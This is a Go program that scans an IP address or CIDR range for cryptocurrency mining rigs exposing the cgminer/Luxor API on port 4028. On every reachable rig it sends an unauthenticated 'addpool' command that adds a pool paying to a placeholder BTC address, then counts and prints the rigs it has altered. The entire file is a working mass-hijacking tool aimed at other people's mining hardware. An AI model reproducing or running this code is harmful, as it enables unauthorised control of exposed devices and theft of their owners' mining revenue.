package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"time"
)

// API Docs: https://github.com/ckolivas/cgminer/blob/master/API-README
// API Docs: https://docs.luxor.tech/firmware/api/intro
var (
	total   = 0
	stratum = "pool1"
	btcaddr = "BTC.address.here.worker"
	payload = `{"command": "addpool", "parameter": "` + stratum + `,` + btcaddr + `,"}`
)

// example payload: { "command": "addpool", "parameter": "stratum+tcp://btc.global.luxor.tech:700,account.miner.worker," }

func getRigType(ipaddr string) string {
	conn, err := net.DialTimeout("tcp", ipaddr+":4028", 5*time.Second)
	if err != nil {
		return "Unknown"
	}
	defer conn.Close()

	conn.Write([]byte(`{"command":"stats"}` + "\n"))
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))

	resp, err := io.ReadAll(conn)
	rigType := "Unknown"
	if err == nil {
		var statsReply struct {
			STATS []map[string]interface{} `json:"STATS"`
		}
		if json.Unmarshal(resp, &statsReply) == nil && len(statsReply.STATS) > 0 {
			if v, ok := statsReply.STATS[0]["Type"].(string); ok {
				rigType = v
			}
		}
	}

	return rigType
}

func changePoolAddr(ipaddr string) {
	conn, err := net.DialTimeout("tcp", ipaddr+":4028", 5*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	conn.Write([]byte(payload + "\n"))
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))

	resp, err := io.ReadAll(conn)
	if err != nil {
		return
	}

	rigType := getRigType(ipaddr)

	type LuxorReply struct {
		Status []struct {
			Status string `json:"STATUS"`
			Msg    string `json:"Msg"`
		} `json:"STATUS"`
	}

	var reply LuxorReply
	if err := json.Unmarshal(resp, &reply); err != nil {
		return
	}

	if len(reply.Status) == 0 {
		return
	}

	status := reply.Status[0].Status
	msg := reply.Status[0].Msg

	if status == "S" && strings.Contains(msg, stratum) {
		total++
		fmt.Printf("[SUCCESS] %s:4028 (%s) --> %s (total: %d)\n", ipaddr, rigType, msg, total)
		return
	}

	fmt.Printf("[FAIL] %s:4028 (%s) -→ STATUS=%s MSG=%s\n", ipaddr, rigType, status, msg)

}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] != 0 {
			break
		}
	}
}

func main() {

	if len(os.Args) != 2 {
		fmt.Printf("Usage: go run %s <IP or CIDR>", os.Args[0])
		return
	}

	ipnet := os.Args[1]

	if _, ips, err := net.ParseCIDR(ipnet); err == nil {
		for ip := ips.IP.Mask(ips.Mask); ips.Contains(ip); incIP(ip) {
			changePoolAddr(ip.String())
			time.Sleep(100 * time.Millisecond)
		}
		fmt.Println("Total pools changed:", total)
		return
	}

	ipv4 := net.ParseIP(ipnet)
	if ipv4 == nil {
		fmt.Println("Invalid IP or CIDR range")
		return
	}

	changePoolAddr(ipv4.String())
	fmt.Println("Total pools changed:", total)
}
